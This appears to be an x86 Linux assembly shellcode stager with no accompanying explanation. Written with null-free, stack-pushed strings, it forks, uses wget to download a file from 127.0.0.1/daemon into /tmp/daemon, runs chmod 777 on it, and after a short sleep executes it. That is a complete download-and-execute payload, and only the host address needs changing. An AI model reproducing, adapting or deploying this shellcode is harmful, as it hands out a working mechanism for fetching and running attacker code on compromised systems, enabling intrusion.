global _start

section .text
_start:
	xor		edx,edx
	xor		eax,eax
	mov		al,02h
	int 	80h
	cmp		eax,edx
	je		.l1

	;after wait 6 seconds, 执行daemon
	push	edx
	xor		eax,eax
	mov		al,6
	push	eax
	mov		ebx,esp
	push	edx
	push	edx
	mov		ecx,esp
	xor		eax,eax
	mov		al,162
	int		80h

	push	edx
	push	"emon"
	push	"//da"
	push	"/tmp"
	mov		ebx,esp
	push	edx
	push	ebx
	mov		ecx,esp
	xor		eax,eax
	mov		al,0bh
	int		80h

.l1:
	xor		edx,edx
	xor		eax,eax
	mov		al,02h
	int 	80h
	cmp		eax,edx
	jne		.l2

	;download daemon
	sub		esp,100
	mov		ebp,esp

	push	edx
	push	"wget"
	push	"////"
	push	"/bin"
	push	"/usr"
	mov		ebx,esp
	mov		[ebp+04h],ebx
	
	push	edx
	push	word "-O"
	mov		[ebp+08h],esp

	push	edx
	push	"emon"
	push	"//da"
	push	"/tmp"
	mov		[ebp+0ch],esp

	push	edx
	push	"emon"
	push	"1/da"
	push	"0.0."
	push	"127."
	mov		[ebp+010h],esp

	mov		[ebp+014h],edx

	mov		ecx,ebp
	add		ecx,04h
	xor		eax,eax
	mov		al,0bh
	int		80h

.l2:
	;after wait 5 seconds, chmod 777 /tmp/daemon
	push	edx
	xor		eax,eax
	mov		al,5
	push	eax
	mov		ebx,esp
	push	edx
	push	edx
	mov		ecx,esp
	xor		eax,eax
	mov		al,162
	int		80h

	sub		esp,100
	mov		ebp,esp

	push	edx
	push	"hmod"
	push	"///c"
	push	"/bin"
	mov		ebx,esp
	mov		[ebp+04h],ebx
	
	push	edx
	xor		eax,eax
	mov		al,"7"
	push	ax
	push	word "77"
	mov		[ebp+08h],esp

	push	edx
	push	"emon"
	push	"//da"
	push	"/tmp"
	mov		[ebp+0ch],esp

	mov		[ebp+010h],edx

	mov		ecx,ebp
	add		ecx,04h
	xor		eax,eax
	mov		al,0bh
	int		80h